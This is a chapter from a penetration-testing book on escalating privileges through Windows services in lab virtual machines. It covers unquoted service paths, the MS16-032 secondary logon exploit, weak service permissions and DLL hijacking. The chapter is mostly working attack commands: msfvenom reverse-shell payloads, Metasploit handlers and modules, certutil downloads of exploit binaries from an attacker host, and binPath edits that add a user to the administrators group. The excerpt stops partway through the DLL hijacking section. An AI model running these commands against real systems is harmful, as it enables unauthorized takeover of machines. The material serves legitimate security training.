<html><head></head><body><div id="sbo-rt-content"><div id="_idContainer229">
			<h1 id="_idParaDest-111"><em class="italic"><a id="_idTextAnchor114"/>Chapter 8</em>: Exploiting Services</h1>
			<p>Now that you have a good grasp of the common privilege escalation attack vectors on Windows, we can take a deeper look at Windows services and begin exploring the privilege escalation techniques that leverage vulnerabilities and misconfigurations in services in order to elevate our privileges on the target system. The objective of this chapter is to identify and exploit vulnerabilities and misconfigurations in common Windows services.</p>
			<p>We will explore the process of identifying and exploiting unquoted service paths and weak service permissions, and we will then take a look at how to exploit the Windows secondary logon in order to elevate our privileges. We will also take an in-depth look at the process of identifying and hijacking missing <strong class="bold">Dynamic Link Libraries</strong> (<strong class="bold">DLLs</strong>).</p>
			<p>In this chapter, we're going to cover the following main topics:</p>
			<ul>
				<li>Exploiting services and misconfigurations</li>
				<li>Exploiting unquoted service paths</li>
				<li>Exploiting secondary logon </li>
				<li>Exploiting weak service permissions</li>
				<li>DLL hijacking</li>
			</ul>
			<h1 id="_idParaDest-112"><a id="_idTextAnchor115"/>Technical requirements </h1>
			<p>To follow along with the demonstrations in this chapter, you will need to ensure that you are familiar with Windows CMD commands.</p>
			<p>You can view this chapter's code in action here: <a href="https://bit.ly/3utJTyI">https://bit.ly/3utJTyI</a></p>
			<h1 id="_idParaDest-113"><a id="_idTextAnchor116"/>Exploiting services and misconfigurations</h1>
			<p>Windows <a id="_idIndexMarker476"/>utilizes<a id="_idIndexMarker477"/> various services to manage and maintain standard system functionality, such as starting services, configuring start up programs, authentication, and software installation, to name a few. Our objective is to find vulnerabilities and misconfigurations in these services in order to elevate our privileges. </p>
			<p>This process is dynamic and, as a result, will depend on the target configuration and deployment use case, primarily because the techniques involved in this process will depend on the implementation and configuration of particular services.</p>
			<p>Given the robust nature of this process and the techniques used, we will be utilizing the Metasploitable3 virtual machine that we set up in <a href="B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030"><em class="italic">Chapter 2</em></a>, <em class="italic">Setting Up Our Lab</em>, of this book.</p>
			<p>This is because the Metasploitable3 virtual machine runs on Windows Server 2008 and has been configured to be run as a server, as well as hosting various services and applications.</p>
			<p>This robust configuration of applications provides a great real-world scenario for a practical <a id="_idIndexMarker478"/>demonstration of the tools and techniques that we will be using in<a id="_idIndexMarker479"/> this chapter.</p>
			<p>Before we begin, ensure that you have a foothold on the target system and have access through a command shell or Meterpreter session.</p>
			<p>The techniques and tools used in this chapter will involve utilizing native Windows commands and specific Meterpreter modules to automate various aspects of the process.</p>
			<h1 id="_idParaDest-114"><a id="_idTextAnchor117"/>Exploiting unquoted service paths</h1>
			<p>When<a id="_idIndexMarker480"/> starting or running services, Windows requires the location of the target executable in order to run. The path of the executable is typically encapsulated by quotation marks, which allows Windows to locate the path or location of the executable. The following path is an example of a secure service p<a id="_idTextAnchor118"/>ath:</p>
			<p class="source-code">"C:\Program Files\OpenSSH\bin\cygrunsrv.exe"</p>
			<p>If the path of the executable is not encapsulated by quotation marks, Windows will resort to searching for the executable in every directory and executing each one until it locates the target executable. We can leverage this vulnerability to elevate our privileges by identifying a service that runs under administrative privileges and that is not encapsulated in quotation marks. The following path is an example of an insecure service path that we can exploit:</p>
			<p class="source-code">C:\Program Files\OpenSSH\bin\cygrunsrv.exe</p>
			<p>The exploitation process involves generating and uploading a binary to the target system, which will provide us with an elevated reverse shell or Meterpreter session when executed. </p>
			<p>This technique can be recreated by following this procedure:</p>
			<ol>
				<li>The first step in this process involves identifying a service path that is not encapsulated<a id="_idIndexMarker481"/> by quotation marks, which can be done by utilizing the <strong class="bold">Windows Management Instrumentation</strong> (<strong class="bold">WMIC</strong>) interface in conjunction with the <strong class="source-inline">findstr</strong> utility. This can be done by running the following command in the Windows <a id="_idIndexMarker482"/>command shell on the target system:<p class="source-code"><strong class="bold">wmic service get name,displayname,pathname,startmode |findstr /i /v "c:\" |findstr /i /v """</strong></p><p>This command will output a list of services with unquoted service paths; in our case, we were able to identify a plethora of services with unquoted paths that  we can exploit. As highlighted in the following screenshot, we can use the OpenSSH service path:</p><div id="_idContainer194" class="IMG---Figure"><img src="Images/B17389_08_001.jpg" alt="Figure 8.1 – Finding unquoted service paths&#13;&#10;" width="368" height="29"/></div><p class="figure-caption">Figure 8.1 – Finding unquoted service paths</p><p>The reason we are utilizing the OpenSSH service is that the service requires administrative privileges to run and, as a result, is executed under the administrative user.</p></li>
				<li>The next step involves checking the directory permissions in order to determine whether we can write or make changes to the OpenSSH service directory. We can check<a id="_idIndexMarker483"/> the permissions of the directory by utilizing the <strong class="bold">Integrity Control Access Control Lists</strong> (<strong class="bold">icacls</strong>) utility by running the following command:<p class="source-code"><strong class="bold">icacls "C:\Program Files\OpenSSH"</strong></p><p>As highlighted in the following screenshot, this will output the directory permissions; in this case, standard users on the system have write permissions, therefore giving us the ability to make changes to the contents of the directory as we are part of the <strong class="source-inline">BUILTIN\Users</strong> group:</p><div id="_idContainer195" class="IMG---Figure"><img src="Images/B17389_08_002.jpg" alt="Figure 8.2 – Service path permissions&#13;&#10;" width="620" height="272"/></div><p class="figure-caption">Figure 8.2 – Service path permissions</p><p>We can leverage <a id="_idIndexMarker484"/>this misconfiguration to elevate our privileges by replacing the OpenSSH executable with a reverse shell binary. Once the OpenSSH service has been started or restarted, the reverse shell binary will be executed instead of the OpenSSH executable.</p><p class="callout-heading">Tip</p><p class="callout">The reverse shell payload should have the same name as the service we are trying to exploit and should be uploaded to the respective service path we identified earlier.</p></li>
				<li>We can generate the Meterpreter payload with <strong class="source-inline">msfvenom</strong> and save it as an executable. This can be done by running the following command in Kali:<p class="source-code"><strong class="bold">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;LISTENER-IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; /home/kali/Desktop/cygrunsrv.exe</strong></p></li>
				<li>After generating the payload, we can upload it to the OpenSSH service path, as follows:<p class="source-code">C:\Program Files\OpenSSH\bin</p></li>
				<li>Before we can upload the Meterpreter payload, we need to change the name of the original binary. However, it is recommended to take a backup of the original binary in the event that the process does not work as expected. The original executable can be deleted by running the following command in the Meterpreter session:<p class="source-code"><strong class="bold">rm cygrunsrv.exe</strong></p></li>
				<li>We can now upload the Meterpreter executable to the OpenSSH service path on the target <a id="_idIndexMarker485"/>using Meterpreter by running the following command:<p class="source-code"><strong class="bold">upload /home/kali/Desktop/cygrunsrv.exe</strong></p><p>In the event you are using a standard command shell, you can use the <strong class="source-inline">certutil</strong> utility to transfer the binary to the target system.</p></li>
				<li>As illustrated in the following screenshot, this will upload the Meterpreter executable to the OpenSSH service path:<div id="_idContainer196" class="IMG---Figure"><img src="Images/B17389_08_003.jpg" alt="Figure 8.3 – Uploading the Meterpreter payload&#13;&#10;" width="940" height="113"/></div><p class="figure-caption">Figure 8.3 – Uploading the Meterpreter payload</p></li>
				<li>We now need to set up the Meterpreter listener with Metasploit. This can be done by running the following command in the Metasploit console:<p class="source-code"><strong class="bold">use /exploit/multi/handler</strong></p></li>
				<li>The next step involves specifying the payload we used to create the binary with <strong class="source-inline">msfvenom</strong>. This can be done by running the following command:<p class="source-code"><strong class="bold">set payload /windows/x64/meterpreter/reverse_tcp</strong></p></li>
				<li>We now need to configure the module options. In this case, we need to configure the <strong class="source-inline">LHOST</strong> and <strong class="source-inline">LPORT</strong> options as highlighted in the following screenshot:<div id="_idContainer197" class="IMG---Figure"><img src="Images/B17389_08_004.jpg" alt="Figure 8.4 – Meterpreter payload options&#13;&#10;" width="980" height="314"/></div><p class="figure-caption">Figure 8.4 – Meterpreter payload options</p></li>
				<li>After setting <a id="_idIndexMarker486"/>the module options, we can start the listener by running the following command:<p class="source-code"><strong class="bold">run</strong></p><p>The listener will listen for any incoming connections from the payload we generated with <strong class="source-inline">msfvenom</strong>.</p></li>
				<li>In order to execute the Meterpreter executable, we need to restart the OpenSSH service. This can be done by running the following commands in the Windows command shell:<p class="source-code"><strong class="bold">sc stop OpenSSHd</strong></p><p class="source-code"><strong class="bold">sc start OpenSSHd</strong></p></li>
				<li>As illustrated in the following screenshot, this will restart the OpenSSH service and in turn, we should receive a privileged Meterpreter session on our listener:<div id="_idContainer198" class="IMG---Figure"><img src="Images/B17389_08_005.jpg" alt="Figure 8.5 – Meterpreter session&#13;&#10;" width="1009" height="204"/></div><p class="figure-caption">Figure 8.5 – Meterpreter session</p></li>
				<li>We can verify that we have an elevated Meterpreter session by running the following command:<p class="source-code"><strong class="bold">getuid</strong></p><p>As illustrated in the following screenshot, we have successfully elevated our privileges and should have a Meterpreter session with administrative privileges:</p><div id="_idContainer199" class="IMG---Figure"><img src="Images/B17389_08_006.jpg" alt="Figure 8.6 – Unquoted service path Meterpreter privileges&#13;&#10;" width="549" height="85"/></div><p class="figure-caption">Figure 8.6 – Unquoted service path Meterpreter privileges</p></li>
				<li>We can also automate the process by using a Metasploit module to identify and exploit a target service with an unquoted service path and automatically upload a reverse shell payload that will provide us with an elevated Meterpreter session. This<a id="_idIndexMarker487"/> can be done by running the following command in the Metasploit console:<p class="source-code"><strong class="bold">use exploit/windows/local/unquoted_service_path</strong></p><p>After loading the module, we need to configure the module options. In this case, we need to configure the <strong class="source-inline">SESSION</strong> ID and target payload as highlighted in the following screenshot:</p><div id="_idContainer200" class="IMG---Figure"><img src="Images/B17389_08_007.jpg" alt="Figure 8.7 – Unquoted service path module options&#13;&#10;" width="1173" height="408"/></div><p class="figure-caption">Figure 8.7 – Unquoted service path module options</p></li>
				<li>After configuring the module options, we can launch the module by running the following command in the Metasploit console:<p class="source-code"><strong class="bold">run</strong></p><p>As highlighted in the following screenshot, if the module runs successfully, we should receive a Meterpreter session with elevated privileges:</p><div id="_idContainer201" class="IMG---Figure"><img src="Images/B17389_08_008.jpg" alt="Figure 8.8 – Unquoted service path Meterpreter session&#13;&#10;" width="1444" height="380"/></div><p class="figure-caption">Figure 8.8 – Unquoted service path Meterpreter session</p></li>
				<li>We can <a id="_idIndexMarker488"/>verify that we have an elevated Meterpreter session by running the following command:<p class="source-code"><strong class="bold">getuid</strong></p><p>As highlighted in the following screenshot, we have successfully elevated our privileges and should have a Meterpreter session with administrative privileges:</p></li>
			</ol>
			<div>
				<div id="_idContainer202" class="IMG---Figure">
					<img src="Images/B17389_08_009.jpg" alt="Figure 8.9 – Unquoted service path Meterpreter privileges&#13;&#10;" width="548" height="85"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.9 – Unquoted service path Meterpreter privileges</p>
			<p>We have now been able to successfully elevate our privileges through unquoted service paths and can explore the process of exploiting the secondary logon handle. </p>
			<h1 id="_idParaDest-115"><a id="_idTextAnchor119"/>Exploiting secondary logon </h1>
			<p>The secondary<a id="_idIndexMarker489"/> logon is a Windows service that is used by administrators to perform administrative tasks through a standard system account. This service can be exploited through an inherent vulnerability that affects the following versions of Windows:</p>
			<ul>
				<li>Windows 7</li>
				<li>Windows Server 2008</li>
				<li>Windows 8.1</li>
				<li>Windows Server 2012</li>
				<li>Windows 10</li>
			</ul>
			<p>The exploitation process leverages the lack of sanitization of handles in the secondary logon service, which can allow a user to duplicate a system service thread handle.</p>
			<p>In this section, we will take a look at how to exploit this vulnerability both manually and automatically using the Metasploit framework. It is important to note, however, that the exploit requires certain dependencies to be met in order for this process to work:</p>
			<ul>
				<li>The target system should have two or more CPU cores.</li>
				<li>The target system should be running PowerShell V2.0 or later.</li>
			</ul>
			<p>More information regarding this exploit can be found here: <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032">https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032</a>.</p>
			<p>Before we begin, ensure that you have a foothold on the target system and have access through a command shell or Meterpreter session.</p>
			<p>Now that we have an understanding of how the exploitation process works, we can take a look at how to exploit the vulnerability to elevate our privileges:</p>
			<ol>
				<li value="1">We have already taken an in-depth look at how to search for and identify exploits in <a href="B17389_04_Final_PG_ePub.xhtml#_idTextAnchor058"><em class="italic">Chapter 4</em></a>, <em class="italic">Performing Local Enumeration</em>, and were able to deduce that the Metasploitable3 virtual machine is vulnerable to this attack. We can begin the process by utilizing a Metasploit module that automates the exploitation process. This can be done by loading the following module in the Metasploit <a id="_idIndexMarker490"/>console:<p class="source-code"><strong class="bold">use exploit/windows/local/ms16_032_secondary_logon_handle_privesc</strong></p><p>After loading the module, we need to configure the module options. In this case, we need to set the default payload, session ID, <strong class="source-inline">LPORT</strong>, and <strong class="source-inline">LHOST</strong> options, as highlighted in the following screenshot:</p><div id="_idContainer203" class="IMG---Figure"><img src="Images/B17389_08_010.jpg" alt="Figure 8.10 – Secondary logon handle module options&#13;&#10;" width="990" height="336"/></div><p class="figure-caption">Figure 8.10 – Secondary logon handle module options</p></li>
				<li>After configuring the module options, we can launch the module by running the following command in the Metasploit console:<p class="source-code"><strong class="bold">run</strong></p><p>As illustrated in the following screenshot, if the module runs successfully, we should receive a Meterpreter session with elevated privileges:</p><div id="_idContainer204" class="IMG---Figure"><img src="Images/B17389_08_011.jpg" alt="Figure 8.11 – Secondary logon handle exploit successful" width="1013" height="336"/></div><p class="figure-caption">Figure 8.11 – Secondary logon handle exploit successful </p></li>
				<li>We can verify that we have an elevated Meterpreter session by running the following command:<p class="source-code"><strong class="bold">getuid</strong></p><p>As illustrated <a id="_idIndexMarker491"/>in the following screenshot, we have successfully elevated our privileges and should have a Meterpreter session with administrative privileges:</p><div id="_idContainer205" class="IMG---Figure"><img src="Images/B17389_08_012.jpg" alt="Figure 8.12 – Secondary logon handle Meterpreter privileges&#13;&#10;" width="379" height="73"/></div><p class="figure-caption">Figure 8.12 – Secondary logon handle Meterpreter privileges</p></li>
				<li>Alternatively, if you do not have access to the target through a Meterpreter session, you can compile the exploit and transfer it to the target. The pre-built exploit binaries for this vulnerability can be found here: <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032</a>.<p>As highlighted in the following screenshot, the GitHub repository contains a PowerShell script and pre-built binaries for both x64- and x86-based systems:</p></li>
			</ol>
			<div>
				<div id="_idContainer206" class="IMG---Figure">
					<img src="Images/B17389_08_013.jpg" alt="Figure 8.13 – MS16_032 GitHub repository&#13;&#10;" width="347" height="273"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.13 – MS16_032 GitHub repository</p>
			<p>It is, however, recommended to analyze and compile the exploit code yourself. The source code for the exploit can be found here: <a href="https://github.com/khr0x40sh/ms16-032">https://github.com/khr0x40sh/ms16-032</a>.</p>
			<p>After downloading or compiling the binary, we need to transfer it to the target system. This can be done by following the procedure outlined here:</p>
			<ol>
				<li value="1">To set up a <a id="_idIndexMarker492"/>web server on our Kali virtual machine, we can utilize the <strong class="source-inline">SimpleHTTPServer</strong> Python module to serve the binary file. This can be done by running the following command in the directory where the <strong class="source-inline">ms16-032.exe</strong> binary is stored:<p class="source-code"><strong class="bold">sudo python -m SimpleHTTPServer 80</strong></p></li>
				<li>Alternatively, you can also utilize the Python 3 <strong class="source-inline">http.server</strong> module by running the following command:<p class="source-code"><strong class="bold">sudo python3 -m http.server 80</strong></p></li>
				<li>We can now use the <strong class="source-inline">certutil</strong> utility to download the binary from the Kali virtual machine to our target system. This can be done by running the following command on the target system:<p class="source-code"><strong class="bold">certutil -urlcache -f http://&lt;KALI-VM-IP&gt;/ms16-032.exe ms16-032.exe</strong></p></li>
				<li>We can now execute the <strong class="source-inline">ms16-032.exe</strong> binary. This can be done by running the following command:<p class="source-code"><strong class="bold">.\ms-16-032.exe</strong></p><p>If the binary runs successfully, you should receive output similar to the output highlighted in the following screenshot:</p></li>
			</ol>
			<div>
				<div id="_idContainer207" class="IMG---Figure">
					<img src="Images/B17389_08_014.jpg" alt="Figure 8.14 – MS16-032 manual exploitation&#13;&#10;" width="398" height="272"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.14 – MS16-032 manual exploitation</p>
			<p>We have been able to successfully elevate our privileges by exploiting the secondary logon service<a id="_idIndexMarker493"/> both manually and automatically.</p>
			<p>We can now take a look at how to identify and exploit weak service permissions to elevate our privileges. </p>
			<h1 id="_idParaDest-116"><a id="_idTextAnchor120"/>Exploiting weak service permissions</h1>
			<p>This exploit<a id="_idIndexMarker494"/> involves leveraging improperly configured service permissions in order to elevate our privileges. The objective of this process is to identify services that run with <strong class="source-inline">SYSTEM</strong> or administrative privileges and use the improper permission configurations for the service to execute arbitrary commands through the <strong class="source-inline">BINARY_PATH_NAME</strong> parameter.</p>
			<p>We can exploit this vulnerability to add a standard user to the local administrators group and consequently achieve an elevated state on the system.</p>
			<p>The exploitation process can be performed by following these steps:</p>
			<ol>
				<li value="1">The first step in the process involves identifying services and applications that standard users have access to. This can be facilitated through the use of the <strong class="source-inline">accesschk</strong> utility that is <a id="_idIndexMarker495"/>found in the <strong class="bold">Sysinternals</strong> suite. The <strong class="source-inline">accesschk</strong> executable can be downloaded from here: <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a>.</li>
				<li>After downloading the <strong class="source-inline">accesschk</strong> executable to our Kali virtual machine, we will need to transfer it to the target system. This can be done through Meterpreter by running the following command:<p class="source-code"><strong class="bold">upload /&lt;PATH-TO-EXECUTABLE/accesschk64.exe</strong></p><p>In the event that you are using a standard command shell, you can use the <strong class="source-inline">certutil</strong> utility to transfer the binary to the target system.</p></li>
				<li>After <a id="_idIndexMarker496"/>uploading the <strong class="source-inline">accesschk.exe</strong> binary to the target system, we can enumerate a list of services that standard users have access to by running the following command:<p class="source-code"><strong class="bold">.\accesschk64.exe -uwcqv "vagrant" * -accepteula</strong></p></li>
				<li>In our case, we will use the standard <strong class="source-inline">vagrant</strong> user. As highlighted in the following screenshot, the command should output a list of services that have <strong class="source-inline">SERVICE_ALL_ACCESS</strong> permissions:<p class="callout-heading">Note</p><p class="callout">The <strong class="source-inline">SERVICE_ALL_ACCESS</strong> permission allows any user on the system to take control of and modify the parameters of the service.</p><div id="_idContainer208" class="IMG---Figure"><img src="Images/B17389_08_015.jpg" alt="Figure 8.15 – accesschk results" width="297" height="182"/></div><p class="figure-caption">Figure 8.15 – accesschk results</p><p>We are able to identify a plethora of services with <strong class="source-inline">SERVICE_ALL_ACCESS</strong> permissions. In our case, we will be targeting the OpenSSH service primarily because we were able to identify that it runs with <strong class="source-inline">SYSTEM</strong> or administrative privileges.</p></li>
				<li>The next step involves enumerating additional information regarding the service and its respective parameters. This can be done by running the following command in the Windows command shell:<p class="source-code"><strong class="bold">sc qc OpenSSHd</strong></p><p>As highlighted<a id="_idIndexMarker497"/> in the following screenshot, the command will output information about the service and its parameters:</p><div id="_idContainer209" class="IMG---Figure"><img src="Images/B17389_08_016.jpg" alt="Figure 8.16 – Service parameters&#13;&#10;" width="732" height="308"/></div><p class="figure-caption">Figure 8.16 – Service parameters</p></li>
				<li>We can modify <strong class="source-inline">BINARY_PATH_NAME</strong> to execute arbitrary commands. In our case, we will be adding the <strong class="source-inline">vagrant</strong> user to the local administrators group. This can be done by running the following command:<p class="source-code"><strong class="bold">sc config "OpenSSHd" binPath= "net localgroup administrators vagrant /add"</strong></p><p>As highlighted in the following screenshot, if the operation runs successfully, the <strong class="source-inline">vagrant</strong> user account will be added to the local administrators group and should have administrative privileges:</p><div id="_idContainer210" class="IMG---Figure"><img src="Images/B17389_08_017.jpg" alt="Figure 8.17 – Modifying the binary path&#13;&#10;" width="1006" height="117"/></div><p class="figure-caption">Figure 8.17 – Modifying the binary path</p></li>
				<li>After modifying the binary path parameter, we need to restart the OpenSSH service. This can be done by running the following commands in the Windows command shell:<p class="source-code"><strong class="bold">sc stop OpenSSHd</strong></p><p class="source-code"><strong class="bold">sc start OpenSSHd</strong></p></li>
				<li>We can verify that the <strong class="source-inline">vagrant</strong> user account has been added to the local administrators group by running the following command in the Windows command <a id="_idIndexMarker498"/>shell:<p class="source-code"><strong class="bold">net localgroup administrators</strong></p><p>As highlighted in the following screenshot, the <strong class="source-inline">vagrant</strong> user account is now a member of the local administrators group and has administrative privileges:</p><div id="_idContainer211" class="IMG---Figure"><img src="Images/B17389_08_018.jpg" alt="Figure 8.18 – Local administrator's group members&#13;&#10;" width="385" height="159"/></div><p class="figure-caption">Figure 8.18 – Local administrator's group members</p></li>
				<li>This process can also be automated through the use of a Metasploit module <a id="_idTextAnchor121"/>named <strong class="source-inline">exploit/windows/local/service_permissions</strong>. We can load the module by running the following command in the Metasploit console:<p class="source-code"><strong class="bold">use exploit/windows/local/service_permissions</strong></p><p>After loading the module, we need to configure the module options. In this case, we need to set the default payload, <strong class="source-inline">LHOST</strong>, <strong class="source-inline">LPORT</strong>, and the session ID option, as highlighted in the following screenshot:</p><div id="_idContainer212" class="IMG---Figure"><img src="Images/B17389_08_019.jpg" alt="Figure 8.19 – Service permissions module options&#13;&#10;" width="1018" height="374"/></div><p class="figure-caption">Figure 8.19 – Service permissions module options</p></li>
				<li>After <a id="_idIndexMarker499"/>configuring the module options, we can launch the module by running the following command in the Metasploit console:<p class="source-code"><strong class="bold">run</strong></p><p>As highlighted in the following screenshot, if the module runs successfully, we should receive a Meterpreter session with elevated privileges:</p><div id="_idContainer213" class="IMG---Figure"><img src="Images/B17389_08_020.jpg" alt="Figure 8.20 – Service permissions module Meterpreter session&#13;&#10;" width="1035" height="241"/></div><p class="figure-caption">Figure 8.20 – Service permissions module Meterpreter session</p></li>
				<li>We can verify that we have an elevated Meterpreter session by running the following command:<p class="source-code"><strong class="bold">getuid</strong></p><p>As illustrated in the following screenshot, we have successfully elevated our privileges and should have a Meterpreter session with administrative privileges:</p></li>
			</ol>
			<div>
				<div id="_idContainer214" class="IMG---Figure">
					<img src="Images/B17389_08_021.jpg" alt="Figure 8.21 – Service permissions Meterpreter privileges&#13;&#10;" width="368" height="78"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.21 – Service permissions Meterpreter privileges</p>
			<p>We have been able to successfully elevate our privileges by exploiting weak service permissions both manually and automatically.</p>
			<p>We can now<a id="_idIndexMarker500"/> take a look at the process of DLL hijacking and how it can be leveraged to elevate our privileges. </p>
			<h1 id="_idParaDest-117"><a id="_idTextAnchor122"/>DLL hijacking</h1>
			<p>Windows <strong class="bold">DLLs</strong> are<a id="_idIndexMarker501"/> libraries that are used or called when applications or services are started. If the application or service cannot locate the required DLLs, we can force the application or service to load our own DLL that will run arbitrary commands in order to elevate our privileges.</p>
			<p>For this to work, we must first locate an application that runs with <strong class="source-inline">SYSTEM</strong> privileges and must have the appropriate path permissions that can allow us to upload our custom DLL.</p>
			<p>Applications can load DLLs from various paths on Windows and will typically follow this order:</p>
			<ol>
				<li value="1">Application path or directory</li>
				<li><strong class="source-inline">C:\Windows\System32</strong></li>
				<li><strong class="source-inline">C:\Windows\System</strong></li>
				<li><strong class="source-inline">C:\Windows</strong></li>
				<li><strong class="source-inline">C:\Program Files</strong></li>
				<li>The <strong class="source-inline">PATH</strong> environment variable</li>
			</ol>
			<p>We can also perform DLL hijacking on application or service DLLs that do not have a defined path. The following code snippet is an example of an absolute path:</p>
			<p class="source-code">PATH = C:\Windows\System32\example.dll</p>
			<p>As you can see in the preceding code snippet, the path to the DLL is specified and as a result, the application or service knows exactly where to locate it. The following code snippet is an example of an undefined application or service DLL path that can be exploited:</p>
			<p class="source-code">PATH = example.dll</p>
			<p>In order to<a id="_idIndexMarker502"/> understand how this works, let's take a look at a scenario that will explain and demonstrate the process in greater depth.</p>
			<h2 id="_idParaDest-118"><a id="_idTextAnchor123"/>Setting up our environment</h2>
			<p>In this<a id="_idIndexMarker503"/> section, we will be utilizing the Windows 7 SP1 virtual machine that we set up in <a href="B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030"><em class="italic">Chapter 2</em></a>, <em class="italic">Setting Up Our Lab</em>, of this book. We will also be setting up a vulnerable service that will be used to demonstrate the DLL hijacking process.</p>
			<p>To begin setting up your environment, follow this procedure:</p>
			<ol>
				<li value="1">The first step in the process will involve downloading and running a Windows batch script on the Windows 7 virtual machine. The script can be downloaded from this link: <a href="https://raw.githubusercontent.com/sagishahar/lpeworkshop/master/lpe_windows_setup.bat">https://raw.githubusercontent.com/sagishahar/lpeworkshop/master/lpe_windows_setup.bat</a>.<p>This script will be responsible for setting up the various vulnerable services that will be used in the demonstrations in this chapter.</p></li>
				<li>After downloading the batch script, you will need to execute it with administrative privileges as highlighted in the following screenshot:<div id="_idContainer215" class="IMG---Figure"><img src="Images/B17389_08_022.jpg" alt="Figure 8.22 – Setup script execution options&#13;&#10;" width="308" height="184"/></div><p class="figure-caption">Figure 8.22 – Setup script execution options</p></li>
				<li>After the script has been executed, it will begin setting up the various vulnerable services that <a id="_idIndexMarker504"/>we will be using in this section. After the setup process is completed, you will be prompted to restart the system as illustrated in the following screenshot:<div id="_idContainer216" class="IMG---Figure"><img src="Images/B17389_08_023.jpg" alt="Figure 8.23 – Setup script complete&#13;&#10;" width="567" height="332"/></div><p class="figure-caption">Figure 8.23 – Setup script complete</p></li>
				<li>After restarting the system, we will need to start the vulnerable DLL service. This can be done by running the following command in the Windows command prompt on the target virtual machine:<p class="source-code"><strong class="bold">sc start dllsvc</strong></p><p>As illustrated in the following screenshot, if the initial setup process was run successfully, the service should be executed without any issues:</p></li>
			</ol>
			<div>
				<div id="_idContainer217" class="IMG---Figure">
					<img src="Images/B17389_08_024.jpg" alt="Figure 8.24 – Starting the vulnerable DLL service" width="909" height="235"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.24 – Starting the vulnerable DLL service</p>
			<p>After starting<a id="_idIndexMarker505"/> the <strong class="source-inline">dllsrv</strong> service, our vulnerable services should be up and running and we should be able to move on to the exploitation phase.</p>
			<h2 id="_idParaDest-119"><a id="_idTextAnchor124"/>The DLL exploitation process</h2>
			<p>Now that <a id="_idIndexMarker506"/>we have our target system configured with the various vulnerable services, we can begin the DLL hijacking process.</p>
			<p>Before we commence with the demonstrations, ensure that you have established an initial foothold on the target system:</p>
			<ol>
				<li value="1">The first step in the exploitation phase involves identifying the application or services with missing DLLs. This<a id="_idIndexMarker507"/> can be done through the <strong class="bold">winPEAS</strong> enumeration tool that we used in <a href="B17389_04_Final_PG_ePub.xhtml#_idTextAnchor058"><em class="italic">Chapter 4</em></a>, <em class="italic">Performing Local Enumeration</em>, of this book. <p>The winPEAS <a id="_idIndexMarker508"/>binary can be downloaded from the GitHub repository here: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe</a>.</p><p>Ensure you download the correct binary based on the architecture of your target operating system; the architecture-specific binaries can be found in the <strong class="source-inline">binaries</strong> folder, as highlighted in the following screenshot:</p><div id="_idContainer218" class="IMG---Figure"><img src="Images/B17389_08_025.jpg" alt="Figure 8.25 – winPEAS binaries" width="658" height="350"/></div><p class="figure-caption">Figure 8.25 – winPEAS binaries</p></li>
				<li>After <a id="_idIndexMarker509"/>downloading the binary to our Kali virtual machine, we need to transfer the <strong class="source-inline">winPEAS.exe</strong> binary to our target virtual machine. <p>We can transfer the <strong class="source-inline">winPEAS.exe</strong> binary to the target system with Meterpreter by running the following command:</p><p class="source-code"><strong class="bold">upload /&lt;PATH-To-BINARY&gt;/winPEASx64.exe</strong></p><p>In the event you are using a standard command shell, you can use the <strong class="source-inline">certutil</strong> utility to transfer the binary to the target system.</p></li>
				<li>After uploading the <strong class="source-inline">winPEAS.exe</strong> binary to the target system, we can enumerate a list of services that have missing DLLs by running the following command:<p class="source-code"><strong class="bold">.\winPEASx64.exe servicesinfo</strong></p><p>As highlighted in the following screenshot, this will enumerate a list of services with missing DLLs and their respective paths. In our case, we are able to identify the application path for the <strong class="source-inline">dllsvc</strong> service that has the necessary permissions:</p><div id="_idContainer219" class="IMG---Figure"><img src="Images/B17389_08_026.jpg" alt="Figure 8.26 – winPEAS DLL hijacking paths&#13;&#10;" width="1606" height="196"/></div><p class="figure-caption">Figure 8.26 – winPEAS DLL hijacking paths</p><p>We are also able to identify the vulnerable DLL hijacking service as illustrated in the following <a id="_idIndexMarker510"/>screenshot:</p><div id="_idContainer220" class="IMG---Figure"><img src="Images/B17389_08_027.jpg" alt="Figure 8.27 – winPEAS DLL hijacking services&#13;&#10;" width="1167" height="71"/></div><p class="figure-caption">Figure 8.27 – winPEAS DLL hijacking services</p></li>
				<li>We can also identify missing DLLs for <strong class="source-inline">dllhijackservice.exe</strong> manually. This can be done<a id="_idIndexMarker511"/> through the Process Monitor utility, which can be downloaded here: <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">https://docs.microsoft.com/en-us/sysinternals/downloads/procmon</a>.</li>
				<li>After downloading the Process Monitor executable to the target system, we can execute it and set the filter options highlighted in the following screenshot:<div id="_idContainer221" class="IMG---Figure"><img src="Images/B17389_08_028.jpg" alt="Figure 8.28 – Process Monitor result filter&#13;&#10;" width="514" height="250"/></div><p class="figure-caption">Figure 8.28 – Process Monitor result filter</p></li>
				<li>After <a id="_idIndexMarker512"/>setting the result filter with a value of <strong class="source-inline">NAME NOT FOUND</strong>, we need to set up an additional path filter to only display <strong class="source-inline">.dll</strong> files, as highlighted in the following screenshot:<div id="_idContainer222" class="IMG---Figure"><img src="Images/B17389_08_029.jpg" alt="Figure 8.29 – Process Monitor path filter" width="516" height="269"/></div><p class="figure-caption">Figure 8.29 – Process Monitor path filter</p></li>
